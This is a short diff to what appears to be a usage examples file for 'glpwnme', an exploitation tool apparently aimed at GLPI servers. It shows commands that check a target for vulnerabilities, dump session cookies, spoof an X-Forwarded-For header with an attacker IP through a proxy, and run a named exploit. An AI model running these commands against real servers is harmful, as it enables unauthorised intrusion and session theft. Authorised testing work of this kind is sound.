@@ -10,7 +10,7 @@ glpwnme -t "$TARGET" --cookie "$COOKIE" --no-init --check-all
 glpwnme -t "$TARGET" --token "$TOKEN" --dump-cookies
 
 # Use custom headers and a proxy
-glpwnme -t "$TARGET" -H "X-Forwarded-For: $ATTACKER_IP" "User-Agent: Nihil" --proxy "$PROXY" --check-all
+glpwnme -t "$TARGET" -H "X-Forwarded-For: ${ATTACKER_IP:-$(fzf-ip)}" "User-Agent: Nihil" --proxy "$PROXY" --check-all
 
 # Inspect, check, run, and clean a specific exploit
 glpwnme -t "$TARGET" -e "$EXPLOIT" --infos
